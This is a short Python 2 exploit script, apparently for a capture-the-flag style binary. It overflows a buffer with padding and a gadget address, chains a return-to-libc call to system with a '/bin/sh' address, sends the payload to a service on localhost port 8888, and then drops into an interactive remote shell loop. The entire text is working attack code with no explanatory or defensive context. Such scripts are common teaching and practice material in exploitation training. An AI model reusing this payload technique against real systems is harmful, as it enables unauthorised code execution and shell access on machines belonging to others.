from struct import *
from socket import *
p = lambda x: pack('<L', x)

system 		= 0x007db0e7
add_gadget 	= 0x0804854a
sh_addr 	= 0x008bd987

payload = ""
payload += ("A"*40 + p(add_gadget) + '\n') * 4
payload += "A"*8 + p(system) + "A" * 4 + p(sh_addr)

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 8888))
print s.recv(1024)
s.send(payload)
s.send("id\n")
while True:
	s.send(raw_input('$ ') + '\n')
	print s.recv(1024)
s.close()
